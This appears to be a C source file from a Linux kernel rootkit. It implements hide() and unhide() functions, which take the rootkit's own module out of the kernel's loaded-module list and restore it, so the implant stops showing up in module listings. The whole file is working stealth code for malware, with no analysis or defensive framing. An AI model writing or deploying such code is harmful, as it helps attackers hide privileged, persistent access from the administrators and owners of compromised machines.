#include <linux/module.h>

#include "../include/debug.h"

#include "include/hide.h"

int hide(void)
{
    RKT_DEBUG("Hiding the rootkit\n");

    if (hidden)
    {
        RKT_DEBUG("Rootkit already hidden.\n");
        return -1;
    }

    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;

    RKT_DEBUG("Should have hidden the rootkit\n");

    return 0;
}

int unhide(void)
{
    RKT_DEBUG("Unhiding the rootkit\n");

    if (!hidden)
    {
        RKT_DEBUG("Rootkit already shown.\n");
        return -1;
    }

    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;

    RKT_DEBUG("Should have revealed the rootkit\n");

    return 0;
}